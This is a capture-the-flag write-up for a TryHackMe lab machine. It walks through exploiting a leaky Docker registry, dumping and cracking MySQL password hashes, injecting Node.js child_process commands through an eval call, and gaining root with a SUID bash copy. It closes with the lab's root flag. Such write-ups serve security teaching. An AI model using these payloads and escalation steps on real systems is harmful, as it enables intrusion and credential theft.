# TryHackMe - Umbrella CTF Challenge Write-Up

## Overview
A comprehensive and high-level technical walkthrough of the TryHackMe - Umbrella CTF Challenge, targeting the IP `10.10.124.182`. This write-up details the steps taken for reconnaissance, exploitation, and privilege escalation.

### Initial Reconnaissance with Nmap
- **Nmap Scan Results:**
  Conducted an Nmap scan to identify open ports and services:
  - SSH (22/tcp)
  - MySQL (3306/tcp)
  - Docker Registry (5000/tcp)
  - Node.js with Express (8080/tcp)

  The scan revealed potential attack vectors through these services.

### Docker Registry Environment Variable Leakage
- **Extracting Environment Variables:**
  Used the Docker Registry API to leak environment variables. This step revealed crucial database credentials and the log file path.

  Commands used:
  ```bash
  curl -s http://10.10.124.182:5000/v2/_catalog
  curl -s http://10.10.124.182:5000/v2/umbrella/timetracking/manifests/latest
  ```

### Database Credential Exposure
- **Accessing the MySQL Database:**
  Successfully accessed the `timetracking` MySQL database using the leaked credentials. Extracted user data and hashed passwords.

  Command used:
  ```bash
	root@ip-10-10-166-207:~# mysql -h 10.10.124.182 -u root -p'Ng1-f3!Pe7-e5?Nf3xe5' timetracking -e 'SELECT * FROM users;'
	mysql: [Warning] Using a password on the command line interface can be insecure.
	+----------+----------------------------------+-------+
	| user     | pass                             | time  |
	+----------+----------------------------------+-------+
	| claire-r | 2ac9cb7dc02b3c0083eb70898e549b63 |   360 |
	| chris-r  | 0d107d09f5bbe40cade3de5c71e9e9b7 |   420 |
	| jill-v   | d5c0607301ad5d5c1528962a83992ac8 |   564 |
	| barry-b  | 4a04890400b5d7bac101baace5d7e994 | 47893 |
	+----------+----------------------------------+-------+
  ```

### Password Cracking
- **MD5 Hash Decryption:**
  Cracked the MD5 hashed passwords using crackstation.net, revealing plaintext passwords.

  ```
    claire-r:2ac9cb7dc02b3c0083eb70898e549b63:Password1
    chris-r:0d107d09f5bbe40cade3de5c71e9e9b7:letmein
    jill-v:d5c0607301ad5d5c1528962a83992ac8:sunshine
    barry-b:4a04890400b5d7bac101baace5d7e994:sandwich
  ```

### SSH Access
- **Gaining SSH Access:**
  Used the decrypted passwords to gain SSH access with user `claire-r`.

### Docker Container Logs Directory
- **Identifying Mounted Directory:**
  Found a mounted directory in the Docker container linked to a logs directory on the host.

  Docker configuration review:
  ```bash
    cat docker-compose.yml
  ```

  ```bash
    claire-r@ctf:~/timeTracker-src$ cat app.js | grep eval
	let timeCalc = parseInt(eval(request.body.time));
  ```

### Remote Code Execution
- **Exploiting Node.js Application:**
  Discovered a remote code execution vulnerability in the Node.js application through an `eval` statement in `app.js`.

  Command used for RCE:
  ```javascript
  require('child_process').exec("echo 'asdf2' > /logs/asdf.txt");
  ```

### Privilege Escalation
- **Escalating to Root:**
  Escalated privileges from the Docker container to root by manipulating file ownership and permissions.

  Privilege escalation steps:
  - Copied `/bin/bash` to the logs directory.
  - Changed ownership and set SUID bit to the copied `bash` executable.

  Commands used:
  ```bash
    # Via ssh
    claire-r@ctf:~/timeTracker-src/logs$ cp /bin/bash .

    # On the Node.js application
    require('child_process').exec("chown root:root /logs/bash");
    require('child_process').exec("chmod 4777 /logs/bash");

    # Via ssh
    claire-r@ctf:~/timeTracker-src/logs$ ./bash -p
    # 
  ```

### Final Outcome
- Successfully accessed the root directory and retrieved the root flag.

  Root flag extraction:
  ```bash
    # cat /root/root.txt
    THM{1e15fbe7978061c6bb1924124fd9eab2}
  ```

## Conclusion
This CTF challenge showcased a variety of skills, including network scanning, API exploitation, database access, password cracking, remote code execution, and privilege escalation. Each step was meticulously executed, leading to a successful compromise of the target system.